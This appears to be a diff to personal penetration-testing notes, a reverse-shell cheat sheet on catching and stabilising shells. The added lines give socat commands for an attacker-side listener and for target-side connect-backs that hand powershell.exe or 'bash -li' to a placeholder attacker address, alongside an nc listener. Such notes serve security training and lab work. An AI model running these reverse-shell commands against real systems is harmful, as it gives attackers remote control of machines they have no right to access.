@@ -1,4 +1,4 @@
-Cheat Sheet for Reverse Shell:
+# Cheat Sheet for Reverse Shell:
 https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 Interative shell commands steps:
@@ -16,6 +16,21 @@ This does two things: first, it turns off our own terminal echo (which gives us 
 First invoke a listner
 >> rlwrap nc -lvnp <port>
 This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
+
+* using socat
+Start a listener on the attacker machine
+>>socat TCP-L:<port> -
+
+on the target machine:
+On Windows we would use this command to connect back:
+>>socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
+
+This is the equivalent command for a Linux Target:
+>>socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+
+
 
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys
 
